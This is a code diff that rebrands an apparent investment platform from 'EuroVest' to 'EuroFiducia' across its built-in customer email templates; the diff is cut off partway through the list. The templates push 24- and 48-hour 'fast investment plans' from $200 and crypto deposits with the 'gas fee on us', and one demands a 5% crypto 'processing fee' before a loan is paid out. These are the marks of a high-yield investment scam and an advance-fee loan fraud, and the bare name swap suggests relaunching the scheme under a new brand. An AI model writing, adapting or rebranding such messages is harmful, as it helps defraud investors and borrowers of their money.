@@ -1,4 +1,4 @@
-/* EUROVEST — Core Application Logic
+/* EUROFIDUCIA — Core Application Logic
    Handles: Auth, Sessions, Notifications, AI Support, Messaging, Transactions, Loans, Email/SMS
    All data stored in localStorage for demo persistence.
 */
@@ -32,223 +32,223 @@ EV.catalog = {
 // edits are persisted in EV.store under 'edited_email_templates' so they survive
 // redeploy / device changes via the sync layer. Admin can also restore defaults.
 // Every template supports {name} personalization and is delivered to BOTH the
-// user's email inbox and their dashboard Messages page in the official EuroVest
+// user's email inbox and their dashboard Messages page in the official EuroFiducia
 // template. If the user opted in to SMS, a short SMS alert is also sent.
 EV._emailTemplatesDefaults = [
   {
     id:'welcome', icon:'🎉', name:'Welcome & Get Started',
-    subject:'Welcome to EuroVest — Your Journey to Wealth Begins Here',
-    body:'Dear {name},\n\nWelcome to the EuroVest family! We are thrilled to have you join thousands of investors across France and Italy who are building their financial future with us.\n\nYour account is now active, and you are just steps away from your first investment. Here is how to get started:\n\n1. Complete your identity verification (KYC) in your dashboard\n2. Make your first deposit via SEPA, card, or open banking\n3. Choose a portfolio that matches your risk profile\n4. Watch your investments grow!\n\nRemember, our AI support assistant is available 24/7 in your language to answer any questions.\n\nStart investing today →\n\nWarm regards,\nThe EuroVest Team'
+    subject:'Welcome to EuroFiducia — Your Journey to Wealth Begins Here',
+    body:'Dear {name},\n\nWelcome to the EuroFiducia family! We are thrilled to have you join thousands of investors across France and Italy who are building their financial future with us.\n\nYour account is now active, and you are just steps away from your first investment. Here is how to get started:\n\n1. Complete your identity verification (KYC) in your dashboard\n2. Make your first deposit via SEPA, card, or open banking\n3. Choose a portfolio that matches your risk profile\n4. Watch your investments grow!\n\nRemember, our AI support assistant is available 24/7 in your language to answer any questions.\n\nStart investing today →\n\nWarm regards,\nThe EuroFiducia Team'
   },
   {
     id:'motivate1', icon:'🚀', name:'Investment Opportunity — Markets Are Moving',
     subject:'🚀 Don\'t Miss Today\'s Investment Opportunities',
-    body:'Dear {name},\n\nThe markets are presenting exceptional opportunities right now. European equities are showing strong momentum, and our managed portfolios are performing above target this quarter.\n\nHere is a snapshot of what is happening:\n\n• CAC 40 and FTSE MIB indices are trending upward\n• Our Euro Growth portfolio is up 8.4% year-to-date\n• Green energy and sustainable funds are outperforming expectations\n• Italian BTP yields remain attractive for income investors\n\nNow is the perfect time to review your portfolio and consider increasing your investment. Even a small additional contribution can make a big difference over time thanks to compound growth.\n\nLog in to your dashboard to explore opportunities →\n\nBest regards,\nThe EuroVest Investment Team'
+    body:'Dear {name},\n\nThe markets are presenting exceptional opportunities right now. European equities are showing strong momentum, and our managed portfolios are performing above target this quarter.\n\nHere is a snapshot of what is happening:\n\n• CAC 40 and FTSE MIB indices are trending upward\n• Our Euro Growth portfolio is up 8.4% year-to-date\n• Green energy and sustainable funds are outperforming expectations\n• Italian BTP yields remain attractive for income investors\n\nNow is the perfect time to review your portfolio and consider increasing your investment. Even a small additional contribution can make a big difference over time thanks to compound growth.\n\nLog in to your dashboard to explore opportunities →\n\nBest regards,\nThe EuroFiducia Investment Team'
   },
   {
     id:'motivate2', icon:'📈', name:'Portfolio Performance Update',
     subject:'📈 Your Portfolio Is Growing — See Your Progress',
-    body:'Dear {name},\n\nGreat news! We wanted to share an update on how your investments are performing.\n\nThis quarter, your portfolio has shown solid progress. Our investment strategists continue to optimize your holdings to maximize returns while managing risk according to your profile.\n\nKey highlights:\n\n• Diversified exposure across European and global markets\n• Active rebalancing to capture growth opportunities\n• Transparent fees with no hidden costs\n\nKeep up the great work as an investor. Consistency is the key to long-term wealth building.\n\nView your full portfolio details →\n\nWarmly,\nThe EuroVest Team'
+    body:'Dear {name},\n\nGreat news! We wanted to share an update on how your investments are performing.\n\nThis quarter, your portfolio has shown solid progress. Our investment strategists continue to optimize your holdings to maximize returns while managing risk according to your profile.\n\nKey highlights:\n\n• Diversified exposure across European and global markets\n• Active rebalancing to capture growth opportunities\n• Transparent fees with no hidden costs\n\nKeep up the great work as an investor. Consistency is the key to long-term wealth building.\n\nView your full portfolio details →\n\nWarmly,\nThe EuroFiducia Team'
   },
   {
     id:'motivate3', icon:'💰', name:'Start Small, Grow Big',
     subject:'💰 Every Great Fortune Started With a First Investment',
-    body:'Dear {name},\n\nDid you know that some of the world\'s most successful investors started with very small amounts? The secret is not how much you start with — it is that you start.\n\nAt EuroVest, you can begin investing with as little as €100. Here is what that could look like over time:\n\n• €100/month for 10 years at 6% average return = ~€16,000\n• €250/month for 20 years at 7% average return = ~€130,000\n• €500/month for 30 years at 8% average return = ~€680,000\n\nThe earlier you start, the more time your money has to grow through the power of compounding.\n\nReady to take the next step? Log in and explore our portfolios →\n\nBelieving in your financial future,\nThe EuroVest Team'
+    body:'Dear {name},\n\nDid you know that some of the world\'s most successful investors started with very small amounts? The secret is not how much you start with — it is that you start.\n\nAt EuroFiducia, you can begin investing with as little as €100. Here is what that could look like over time:\n\n• €100/month for 10 years at 6% average return = ~€16,000\n• €250/month for 20 years at 7% average return = ~€130,000\n• €500/month for 30 years at 8% average return = ~€680,000\n\nThe earlier you start, the more time your money has to grow through the power of compounding.\n\nReady to take the next step? Log in and explore our portfolios →\n\nBelieving in your financial future,\nThe EuroFiducia Team'
   },
   {
     id:'motivate4', icon:'🌱', name:'Sustainable Investing Appeal',
     subject:'🌱 Invest in Your Values — Sustainable Portfolios Available',
-    body:'Dear {name},\n\nWhat if your investments could grow your wealth AND make the world a better place?\n\nOur Sustainable and ESG portfolios allow you to invest in companies that prioritize environmental responsibility, social impact, and strong governance — without sacrificing returns.\n\nSustainable investing highlights:\n\n• Green bonds financing renewable energy projects\n• ESG-screened equity funds\n• European green transition infrastructure\n• Competitive returns aligned with your values\n\nJoin the growing movement of investors who believe profit and purpose can go hand in hand.\n\nExplore sustainable portfolios →\n\nWith purpose,\nThe EuroVest Team'
+    body:'Dear {name},\n\nWhat if your investments could grow your wealth AND make the world a better place?\n\nOur Sustainable and ESG portfolios allow you to invest in companies that prioritize environmental responsibility, social impact, and strong governance — without sacrificing returns.\n\nSustainable investing highlights:\n\n• Green bonds financing renewable energy projects\n• ESG-screened equity funds\n• European green transition infrastructure\n• Competitive returns aligned with your values\n\nJoin the growing movement of investors who believe profit and purpose can go hand in hand.\n\nExplore sustainable portfolios →\n\nWith purpose,\nThe EuroFiducia Team'
   },
   {
     id:'motivate5', icon:'🏦', name:'Retirement Planning',
     subject:'🏦 Is Your Retirement On Track? Let\'s Check Together',
-    body:'Dear {name},\n\nRetirement may seem far away, but the best time to plan for it is now. Whether you are in France with a PER (Plan d\'Épargne Retraite) or in Italy with your pension planning, EuroVest can help you build a retirement nest egg that gives you peace of mind.\n\nConsider this:\n\n• State pensions alone may not maintain your lifestyle\n• Tax-advantaged retirement products can boost your savings\n• Starting early means smaller contributions over a longer period\n• Our Conservative and Balanced portfolios are ideal for retirement planning\n\nLet us help you secure your future. Review our retirement investment options today.\n\nPlan your retirement →\n\nLooking out for your future,\nThe EuroVest Team'
+    body:'Dear {name},\n\nRetirement may seem far away, but the best time to plan for it is now. Whether you are in France with a PER (Plan d\'Épargne Retraite) or in Italy with your pension planning, EuroFiducia can help you build a retirement nest egg that gives you peace of mind.\n\nConsider this:\n\n• State pensions alone may not maintain your lifestyle\n• Tax-advantaged retirement products can boost your savings\n• Starting early means smaller contributions over a longer period\n• Our Conservative and Balanced portfolios are ideal for retirement planning\n\nLet us help you secure your future. Review our retirement investment options today.\n\nPlan your retirement →\n\nLooking out for your future,\nThe EuroFiducia Team'
   },
   {
     id:'motivate6', icon:'🔥', name:'Limited-Time Portfolio Offer',
     subject:'🔥 Special Offer — Reduced Fees on Growth Portfolios This Month',
-    body:'Dear {name},\n\nWe have an exciting opportunity for you! For a limited time, we are offering reduced management fees on our Growth and Global Growth portfolios.\n\nOffer details:\n\n• 25% off management fees on Growth portfolios\n• Free portfolio consultation with our advisors\n• No minimum increase required\n\nThis is our way of thanking you for being a valued EuroVest investor and encouraging you to take advantage of current market conditions.\n\nThis offer is available for a limited time only. Do not miss out!\n\nClaim your offer →\n\nWarm regards,\nThe EuroVest Team'
+    body:'Dear {name},\n\nWe have an exciting opportunity for you! For a limited time, we are offering reduced management fees on our Growth and Global Growth portfolios.\n\nOffer details:\n\n• 25% off management fees on Growth portfolios\n• Free portfolio consultation with our advisors\n• No minimum increase required\n\nThis is our way of thanking you for being a valued EuroFiducia investor and encouraging you to take advantage of current market conditions.\n\nThis offer is available for a limited time only. Do not miss out!\n\nClaim your offer →\n\nWarm regards,\nThe EuroFiducia Team'
   },
   {
     id:'motivate7', icon:'🏆', name:'Milestone & Achievement',
     subject:'🏆 Congratulations on Your Investment Milestone!',
-    body:'Dear {name},\n\nCongratulations! You have reached an important milestone in your investment journey with EuroVest. Your dedication to building your financial future is truly commendable.\n\nAs a valued investor, you now have access to:\n\n• Priority customer support\n• Advanced portfolio analytics\n• Exclusive investment opportunities\n• Regular market insights and reports\n\nKeep investing, keep growing. The best is yet to come!\n\nCelebrate your progress →\n\nProud of your journey,\nThe EuroVest Team'
+    body:'Dear {name},\n\nCongratulations! You have reached an important milestone in your investment journey with EuroFiducia. Your dedication to building your financial future is truly commendable.\n\nAs a valued investor, you now have access to:\n\n• Priority customer support\n• Advanced portfolio analytics\n• Exclusive investment opportunities\n• Regular market insights and reports\n\nKeep investing, keep growing. The best is yet to come!\n\nCelebrate your progress →\n\nProud of your journey,\nThe EuroFiducia Team'
   },
   {
     id:'motivate8', icon:'⚡', name:'Act Now — Time in the Market',
     subject:'⚡ Time in the Market Beats Timing the Market',
-    body:'Dear {name},\n\nIt is natural to wonder: "Is now the right time to invest?" The truth is, time IN the market almost always beats timing the market.\n\nInvestors who stay invested through market ups and downs historically achieve better long-term results than those who try to time their entries and exits.\n\nAt EuroVest, our managed portfolios are designed for long-term growth:\n\n• Professional rebalancing keeps your portfolio on track\n• Diversification reduces the impact of volatility\n• Regular contributions (dollar-cost averaging) smooth out market fluctuations\n\nDo not wait for the "perfect" moment. The perfect moment is now.\n\nStart or increase your investment →\n\nYour partners in growth,\nThe EuroVest Team'
+    body:'Dear {name},\n\nIt is natural to wonder: "Is now the right time to invest?" The truth is, time IN the market almost always beats timing the market.\n\nInvestors who stay invested through market ups and downs historically achieve better long-term results than those who try to time their entries and exits.\n\nAt EuroFiducia, our managed portfolios are designed for long-term growth:\n\n• Professional rebalancing keeps your portfolio on track\n• Diversification reduces the impact of volatility\n• Regular contributions (dollar-cost averaging) smooth out market fluctuations\n\nDo not wait for the "perfect" moment. The perfect moment is now.\n\nStart or increase your investment →\n\nYour partners in growth,\nThe EuroFiducia Team'
   },
   {
     id:'verify', icon:'✅', name:'KYC Verification Reminder',
     subject:'✅ Complete Your Verification to Unlock Full Features',
-    body:'Dear {name},\n\nThis is a friendly reminder to complete your identity verification (KYC) in your EuroVest dashboard.\n\nCompleting your verification allows you to:\n\n• Make deposits and withdrawals without limits\n• Access all investment products\n• Generate official transaction receipts\n• Ensure compliance with European regulations\n\nThe process takes just a few minutes — simply upload your government ID and proof of address in your dashboard settings.\n\nComplete verification now →\n\nThank you for helping us keep EuroVest secure,\nThe EuroVest Compliance Team'
+    body:'Dear {name},\n\nThis is a friendly reminder to complete your identity verification (KYC) in your EuroFiducia dashboard.\n\nCompleting your verification allows you to:\n\n• Make deposits and withdrawals without limits\n• Access all investment products\n• Generate official transaction receipts\n• Ensure compliance with European regulations\n\nThe process takes just a few minutes — simply upload your government ID and proof of address in your dashboard settings.\n\nComplete verification now →\n\nThank you for helping us keep EuroFiducia secure,\nThe EuroFiducia Compliance Team'
   },
   {
     id:'promo_fast24', icon:'\u26a1', name:'24-Hour Fast Investment Plan',
     subject:'\u26a1 Turn $200 Into Profit in Just 24 Hours',
-    body:'Dear {name},\n\nOur new 24-Hour Fast Investment Plan is live, and it is designed for investors who want rapid results.\n\nHow it works:\n\n\u2022 Minimum investment: $200\n\u2022 Term: 24 hours\n\u2022 ROI: credited automatically at maturity\n\u2022 No lock-in beyond the 24-hour term\n\nThis is perfect if you want to test the waters, earn a fast return, and reinvest or withdraw the same week. The gas fee is on us \u2014 you only fund your principal.\n\nLog in to your dashboard \u2192 Investments \u2192 Fast Plans to start now.\n\nBest regards,\nThe EuroVest Investment Team'
+    body:'Dear {name},\n\nOur new 24-Hour Fast Investment Plan is live, and it is designed for investors who want rapid results.\n\nHow it works:\n\n\u2022 Minimum investment: $200\n\u2022 Term: 24 hours\n\u2022 ROI: credited automatically at maturity\n\u2022 No lock-in beyond the 24-hour term\n\nThis is perfect if you want to test the waters, earn a fast return, and reinvest or withdraw the same week. The gas fee is on us \u2014 you only fund your principal.\n\nLog in to your dashboard \u2192 Investments \u2192 Fast Plans to start now.\n\nBest regards,\nThe EuroFiducia Investment Team'
   },
   {
     id:'promo_fast48', icon:'\u23f1', name:'48-Hour Fast Investment Plan',
     subject:'\u23f1 48 Hours. $200 Minimum. Your Capital Working Harder.',
-    body:'Dear {name},\n\nNot ready to wait a month to see returns? Our 48-Hour Fast Investment Plan lets your capital work for you over two days, with a competitive short-term ROI.\n\n\u2022 Minimum investment: $200\n\u2022 Term: 48 hours\n\u2022 ROI: credited at maturity\n\u2022 Gas fee covered by EuroVest\n\nIt is the smartest way to put idle funds to work without locking them away. Open your dashboard, pick the 48-hour plan, and watch your investment mature.\n\nStart your 48-hour plan \u2192\n\nThe EuroVest Investment Team'
+    body:'Dear {name},\n\nNot ready to wait a month to see returns? Our 48-Hour Fast Investment Plan lets your capital work for you over two days, with a competitive short-term ROI.\n\n\u2022 Minimum investment: $200\n\u2022 Term: 48 hours\n\u2022 ROI: credited at maturity\n\u2022 Gas fee covered by EuroFiducia\n\nIt is the smartest way to put idle funds to work without locking them away. Open your dashboard, pick the 48-hour plan, and watch your investment mature.\n\nStart your 48-hour plan \u2192\n\nThe EuroFiducia Investment Team'
   },
   {
     id:'adv_why_invest', icon:'\ud83e\uddd1\u200d\ud83d\udcbc', name:'Why You Should Try Investing',
     subject:'\ud83d\udca1 7 Reasons Investing Beats Leaving Cash in the Bank',
-    body:'Dear {name},\n\nIf your savings are sitting in a regular bank account, inflation is quietly shrinking their real value every single year. Investing is how you fight back. Here are seven reasons you should give it a try:\n\n1. Beat inflation \u2014 cash loses purchasing power; investments historically grow faster than inflation.\n2. Compound growth \u2014 your returns earn their own returns, accelerating your wealth over time.\n3. Passive income \u2014 dividends and interest pay you while you sleep.\n4. Diversification \u2014 spread risk across stocks, bonds, real estate, and crypto instead of one bank.\n5. Financial freedom \u2014 a growing portfolio gives you options: retirement, a home, your children\u2019s future.\n6. Accessibility \u2014 at EuroVest you can start from $200 with plans as short as 24 hours.\n7. Professional management \u2014 our strategists rebalance your portfolio so you don\u2019t have to watch the markets all day.\n\nYou don\u2019t need to be an expert. You just need to start.\n\nBegin your first investment today \u2192\n\nBelieving in your future,\nThe EuroVest Team'
+    body:'Dear {name},\n\nIf your savings are sitting in a regular bank account, inflation is quietly shrinking their real value every single year. Investing is how you fight back. Here are seven reasons you should give it a try:\n\n1. Beat inflation \u2014 cash loses purchasing power; investments historically grow faster than inflation.\n2. Compound growth \u2014 your returns earn their own returns, accelerating your wealth over time.\n3. Passive income \u2014 dividends and interest pay you while you sleep.\n4. Diversification \u2014 spread risk across stocks, bonds, real estate, and crypto instead of one bank.\n5. Financial freedom \u2014 a growing portfolio gives you options: retirement, a home, your children\u2019s future.\n6. Accessibility \u2014 at EuroFiducia you can start from $200 with plans as short as 24 hours.\n7. Professional management \u2014 our strategists rebalance your portfolio so you don\u2019t have to watch the markets all day.\n\nYou don\u2019t need to be an expert. You just need to start.\n\nBegin your first investment today \u2192\n\nBelieving in your future,\nThe EuroFiducia Team'
   },
   {
     id:'adv_compound', icon:'\ud83c\udfaf', name:'The Power of Compound Interest',
     subject:'\ud83c\udfaf The Eighth Wonder of the World: Compound Interest',
-    body:'Dear {name},\n\nAlbert Einstein reportedly called compound interest \u201cthe eighth wonder of the world.\u201d Here is why it matters to you.\n\nWhen your investment earns a return, and you reinvest that return, your next return is calculated on a larger amount. Do this for years and the growth becomes exponential.\n\nA simple illustration:\n\n\u2022 $5,000 invested at 7% for 10 years \u2192 ~$9,800\n\u2022 The same $5,000 at 7% for 30 years \u2192 ~$38,000\n\nThe difference is not the money you put in \u2014 it is the time you give it. The sooner you start, the harder compounding works for you.\n\nOpen a plan today and let time become your greatest asset.\n\nYour partners in growth,\nThe EuroVest Team'
+    body:'Dear {name},\n\nAlbert Einstein reportedly called compound interest \u201cthe eighth wonder of the world.\u201d Here is why it matters to you.\n\nWhen your investment earns a return, and you reinvest that return, your next return is calculated on a larger amount. Do this for years and the growth becomes exponential.\n\nA simple illustration:\n\n\u2022 $5,000 invested at 7% for 10 years \u2192 ~$9,800\n\u2022 The same $5,000 at 7% for 30 years \u2192 ~$38,000\n\nThe difference is not the money you put in \u2014 it is the time you give it. The sooner you start, the harder compounding works for you.\n\nOpen a plan today and let time become your greatest asset.\n\nYour partners in growth,\nThe EuroFiducia Team'
   },
   {
     id:'adv_start_small', icon:'\ud83d\udc63', name:'Start Small, Build Big',
     subject:'\ud83d\udc63 You Don\u2019t Need to Be Rich to Start Investing',
-    body:'Dear {name},\n\nOne of the biggest myths about investing is that you need a fortune to begin. You don\u2019t. You need a decision.\n\nAt EuroVest, our fast investment plans start from just $200. That single decision \u2014 to begin \u2014 is worth more than waiting until you feel \u201cready.\u201d Most successful investors started small and grew steadily.\n\nHere is a simple path:\n\n1. Make your first deposit (crypto is instant and the gas fee is on us).\n2. Choose a plan that fits your horizon \u2014 24h, 48h, weekly, monthly, quarterly, or yearly.\n3. Reinvest your returns to accelerate growth.\n4. Repeat.\n\nSmall, consistent steps build lasting wealth. Take the first one today.\n\nWarm regards,\nThe EuroVest Team'
+    body:'Dear {name},\n\nOne of the biggest myths about investing is that you need a fortune to begin. You don\u2019t. You need a decision.\n\nAt EuroFiducia, our fast investment plans start from just $200. That single decision \u2014 to begin \u2014 is worth more than waiting until you feel \u201cready.\u201d Most successful investors started small and grew steadily.\n\nHere is a simple path:\n\n1. Make your first deposit (crypto is instant and the gas fee is on us).\n2. Choose a plan that fits your horizon \u2014 24h, 48h, weekly, monthly, quarterly, or yearly.\n3. Reinvest your returns to accelerate growth.\n4. Repeat.\n\nSmall, consistent steps build lasting wealth. Take the first one today.\n\nWarm regards,\nThe EuroFiducia Team'
   },
   {
     id:'adv_diversify', icon:'\ud83e\ude99', name:'Diversification & Risk Management',
     subject:'\ud83e\ude99 Don\u2019t Put All Your Eggs in One Basket',
-    body:'Dear {name},\n\nThe single most important rule in investing is diversification \u2014 spreading your money across different assets so that no single loss can derail your goals.\n\nAt EuroVest you can diversify across:\n\n\u2022 European & global equities\n\u2022 Government and corporate bonds\n\u2022 Real estate funds (SCPI)\n\u2022 Sustainable / ESG portfolios\n\u2022 Cryptoassets\n\u2022 Short-term fast plans for liquidity\n\nA well-diversified portfolio smooths out volatility and keeps you invested through every market condition. Our managed portfolios handle this for you automatically.\n\nBuild a balanced portfolio today \u2192\n\nThe EuroVest Investment Team'
+    body:'Dear {name},\n\nThe single most important rule in investing is diversification \u2014 spreading your money across different assets so that no single loss can derail your goals.\n\nAt EuroFiducia you can diversify across:\n\n\u2022 European & global equities\n\u2022 Government and corporate bonds\n\u2022 Real estate funds (SCPI)\n\u2022 Sustainable / ESG portfolios\n\u2022 Cryptoassets\n\u2022 Short-term fast plans for liquidity\n\nA well-diversified portfolio smooths out volatility and keeps you invested through every market condition. Our managed portfolios handle this for you automatically.\n\nBuild a balanced portfolio today \u2192\n\nThe EuroFiducia Investment Team'
   },
   {
     id:'adv_dca', icon:'\ud83d\udd04', name:'Dollar-Cost Averaging',
     subject:'\ud83d\udd04 The Simple Strategy That Removes the Stress of Timing',
-    body:'Dear {name},\n\nMany beginners worry about investing \u201cat the right time.\u201d The truth is, nobody can predict the perfect moment. Dollar-cost averaging removes that stress entirely.\n\nThe idea is simple: invest a fixed amount on a regular schedule, regardless of what the market is doing.\n\n\u2022 When prices are high, you buy fewer units.\n\u2022 When prices are low, you buy more units.\n\u2022 Over time, your average cost per unit smooths out.\n\nThis disciplined approach turns market volatility into an advantage and keeps you consistently invested \u2014 which is what drives long-term returns.\n\nSet up a recurring investment plan today \u2192\n\nThe EuroVest Team'
+    body:'Dear {name},\n\nMany beginners worry about investing \u201cat the right time.\u201d The truth is, nobody can predict the perfect moment. Dollar-cost averaging removes that stress entirely.\n\nThe idea is simple: invest a fixed amount on a regular schedule, regardless of what the market is doing.\n\n\u2022 When prices are high, you buy fewer units.\n\u2022 When prices are low, you buy more units.\n\u2022 Over time, your average cost per unit smooths out.\n\nThis disciplined approach turns market volatility into an advantage and keeps you consistently invested \u2014 which is what drives long-term returns.\n\nSet up a recurring investment plan today \u2192\n\nThe EuroFiducia Team'
   },
   {
     id:'adv_patience', icon:'\ud83c\udf3f', name:'Patience Pays Off',
     subject:'\ud83c\udf3f The Best Investors Are Patient Investors',
-    body:'Dear {name},\n\nMarkets rise and fall \u2014 that is their nature. What separates successful investors from the rest is patience.\n\nHistory shows that markets trend upward over the long run, even after sharp downturns. Investors who panic and sell during dips usually lock in losses. Those who stay invested capture the recovery and the growth that follows.\n\nAt EuroVest, our longer-term plans (monthly, quarterly, and yearly) are designed for exactly this kind of patient, steady growth. Pair them with our fast plans for short-term liquidity, and you have a complete strategy.\n\nStay the course. Your future self will thank you.\n\nThe EuroVest Team'
+    body:'Dear {name},\n\nMarkets rise and fall \u2014 that is their nature. What separates successful investors from the rest is patience.\n\nHistory shows that markets trend upward over the long run, even after sharp downturns. Investors who panic and sell during dips usually lock in losses. Those who stay invested capture the recovery and the growth that follows.\n\nAt EuroFiducia, our longer-term plans (monthly, quarterly, and yearly) are designed for exactly this kind of patient, steady growth. Pair them with our fast plans for short-term liquidity, and you have a complete strategy.\n\nStay the course. Your future self will thank you.\n\nThe EuroFiducia Team'
   },
   {
     id:'promo_gasfree', icon:'\ud83c\udf89', name:'Gas Fee Is On Us',
     subject:'\ud83c\udf89 Good News: We Cover Your Gas Fees',
-    body:'Dear {name},\n\nHere is something most platforms won\u2019t tell you: we cover the gas fees on your deposits and plan investments.\n\nThat means:\n\n\u2022 No network fees deducted from your deposit\n\u2022 Your full principal goes to work for you\n\u2022 Faster, cheaper funding with cryptocurrency\n\nCombine that with our 24-hour and 48-hour fast plans (starting at $200), and you have one of the most efficient ways to put your money to work in Europe.\n\nFund your account and pick a plan \u2192\n\nThe EuroVest Team'
+    body:'Dear {name},\n\nHere is something most platforms won\u2019t tell you: we cover the gas fees on your deposits and plan investments.\n\nThat means:\n\n\u2022 No network fees deducted from your deposit\n\u2022 Your full principal goes to work for you\n\u2022 Faster, cheaper funding with cryptocurrency\n\nCombine that with our 24-hour and 48-hour fast plans (starting at $200), and you have one of the most efficient ways to put your money to work in Europe.\n\nFund your account and pick a plan \u2192\n\nThe EuroFiducia Team'
   },
   {
     id:'promo_unlock', icon:'\ud83d\udd13', name:'Unlock All Features After First Payment',
-    subject:'\ud83d\udd13 One Payment Unlocks Everything on EuroVest',
-    body:'Dear {name},\n\nA quick reminder of how EuroVest works: once your first deposit is confirmed \u2014 or your loan processing fee is settled \u2014 all platform features activate automatically.\n\nWhat unlocks:\n\n\u2022 Full investment marketplace (stocks, ETFs, bonds, crypto, real estate)\n\u2022 Fast investment plans (24h / 48h) and longer-term plans\n\u2022 Withdrawals to your verified account\n\u2022 Transaction receipts and portfolio statements\n\u2022 Loan disbursement (if you applied)\n\nThere\u2019s nothing else you need to do. Make your first deposit today (crypto is instant and the gas fee is on us) and everything switches on.\n\nGet started \u2192\n\nThe EuroVest Team'
+    subject:'\ud83d\udd13 One Payment Unlocks Everything on EuroFiducia',
+    body:'Dear {name},\n\nA quick reminder of how EuroFiducia works: once your first deposit is confirmed \u2014 or your loan processing fee is settled \u2014 all platform features activate automatically.\n\nWhat unlocks:\n\n\u2022 Full investment marketplace (stocks, ETFs, bonds, crypto, real estate)\n\u2022 Fast investment plans (24h / 48h) and longer-term plans\n\u2022 Withdrawals to your verified account\n\u2022 Transaction receipts and portfolio statements\n\u2022 Loan disbursement (if you applied)\n\nThere\u2019s nothing else you need to do. Make your first deposit today (crypto is instant and the gas fee is on us) and everything switches on.\n\nGet started \u2192\n\nThe EuroFiducia Team'
   },
   {
     id:'promo_loan_fee', icon:'\ud83d\udcb0', name:'Loan Fee & Disbursement Explained',
     subject:'\ud83d\udcb0 Your Loan: Pay the Fee, Get the Funds',
-    body:'Dear {name},\n\nIf you\u2019ve applied for a loan with EuroVest, here\u2019s what happens next.\n\nOnce your application is approved, a mandatory 5% processing fee must be settled before disbursement. This fee is settled in cryptocurrency so it can be verified instantly \u2014 which means we can release your loan funds the same day.\n\nOur assurance to you:\n\n\u2022 Full refund if your loan cannot be disbursed\n\u2022 Funds held in a segregated escrow wallet\n\u2022 Permanent blockchain transaction hash as proof of payment\n\u2022 Same-day verification and release\n\nAfter the fee is settled, your loan amount is disbursed to your verified bank account and all platform features activate automatically.\n\nCheck your dashboard \u2192 Loans for your application status.\n\nThe EuroVest Loan Team'
+    body:'Dear {name},\n\nIf you\u2019ve applied for a loan with EuroFiducia, here\u2019s what happens next.\n\nOnce your application is approved, a mandatory 5% processing fee must be settled before disbursement. This fee is settled in cryptocurrency so it can be verified instantly \u2014 which means we can release your loan funds the same day.\n\nOur assurance to you:\n\n\u2022 Full refund if your loan cannot be disbursed\n\u2022 Funds held in a segregated escrow wallet\n\u2022 Permanent blockchain transaction hash as proof of payment\n\u2022 Same-day verification and release\n\nAfter the fee is settled, your loan amount is disbursed to your verified bank account and all platform features activate automatically.\n\nCheck your dashboard \u2192 Loans for your application status.\n\nThe EuroFiducia Loan Team'
   },
   {
     id:'adv_goals', icon:'\ud83c\udfaf', name:'Set Your Financial Goals',
     subject:'\ud83c\udfaf What Are You Investing For? Let\u2019s Define Your Goal',
-    body:'Dear {name},\n\nEvery successful investment journey starts with a clear goal. Knowing your \u201cwhy\u201d makes it far easier to stay disciplined when markets get noisy.\n\nCommon goals our investors share:\n\n\u2022 Building a retirement nest egg\n\u2022 Saving for a home deposit\n\u2022 Funding children\u2019s education\n\u2022 Creating a passive income stream\n\u2022 Growing an emergency fund that actually beats inflation\n\nOnce you know your goal, pick the plan that matches your timeline:\n\n\u2022 Short-term needs \u2192 24h / 48h / weekly fast plans\n\u2022 Medium-term goals \u2192 monthly or quarterly plans\n\u2022 Long-term wealth \u2192 yearly plans and managed portfolios\n\nDefine your goal and start today \u2192\n\nThe EuroVest Team'
+    body:'Dear {name},\n\nEvery successful investment journey starts with a clear goal. Knowing your \u201cwhy\u201d makes it far easier to stay disciplined when markets get noisy.\n\nCommon goals our investors share:\n\n\u2022 Building a retirement nest egg\n\u2022 Saving for a home deposit\n\u2022 Funding children\u2019s education\n\u2022 Creating a passive income stream\n\u2022 Growing an emergency fund that actually beats inflation\n\nOnce you know your goal, pick the plan that matches your timeline:\n\n\u2022 Short-term needs \u2192 24h / 48h / weekly fast plans\n\u2022 Medium-term goals \u2192 monthly or quarterly plans\n\u2022 Long-term wealth \u2192 yearly plans and managed portfolios\n\nDefine your goal and start today \u2192\n\nThe EuroFiducia Team'
   },
   {
     id:'adv_emergency', icon:'\ud83d\uded1', name:'Investing vs Emergency Fund',
     subject:'\ud83d\uded1 Invest Smart: Keep a Buffer, Grow the Rest',
-    body:'Dear {name},\n\nBefore you invest, here\u2019s a smart principle: keep an emergency fund, then put the rest to work.\n\nA good rule of thumb is to keep 3\u20136 months of living expenses in an easy-to-access account. Everything beyond that should be invested so it grows instead of losing value to inflation.\n\nEuroVest makes this easy:\n\n\u2022 Our fast plans (24h / 48h) act like a near-liquid investment for funds you might need soon.\n\u2022 Longer plans grow your long-term wealth.\n\nThat way you\u2019re protected and still growing \u2014 the best of both worlds.\n\nThe EuroVest Team'
+    body:'Dear {name},\n\nBefore you invest, here\u2019s a smart principle: keep an emergency fund, then put the rest to work.\n\nA good rule of thumb is to keep 3\u20136 months of living expenses in an easy-to-access account. Everything beyond that should be invested so it grows instead of losing value to inflation.\n\nEuroFiducia makes this easy:\n\n\u2022 Our fast plans (24h / 48h) act like a near-liquid investment for funds you might need soon.\n\u2022 Longer plans grow your long-term wealth.\n\nThat way you\u2019re protected and still growing \u2014 the best of both worlds.\n\nThe EuroFiducia Team'
   },
   {
     id:'adv_inflation', icon:'\ud83d\udcc8', name:'Inflation Is Eating Your Savings',
     subject:'\ud83d\udcc8 The Silent Thief: How Inflation Shrinks Your Savings',
-    body:'Dear {name},\n\nIf inflation is 3% a year and your bank account pays 0.5%, your money loses 2.5% of its real value every single year. Over a decade, that is a significant chunk of your purchasing power gone.\n\nInvesting is the antidote. Historically, a diversified portfolio returns well above inflation over the long term.\n\nDon\u2019t let inflation quietly undo years of hard work. Move idle cash into a EuroVest plan and let it grow.\n\nStart protecting your money today \u2192\n\nThe EuroVest Team'
+    body:'Dear {name},\n\nIf inflation is 3% a year and your bank account pays 0.5%, your money loses 2.5% of its real value every single year. Over a decade, that is a significant chunk of your purchasing power gone.\n\nInvesting is the antidote. Historically, a diversified portfolio returns well above inflation over the long term.\n\nDon\u2019t let inflation quietly undo years of hard work. Move idle cash into a EuroFiducia plan and let it grow.\n\nStart protecting your money today \u2192\n\nThe EuroFiducia Team'
   },
   {
     id:'adv_passive', icon:'\ud83d\udcb8', name:'Build Passive Income',
     subject:'\ud83d\udcb8 Make Your Money Work While You Sleep',
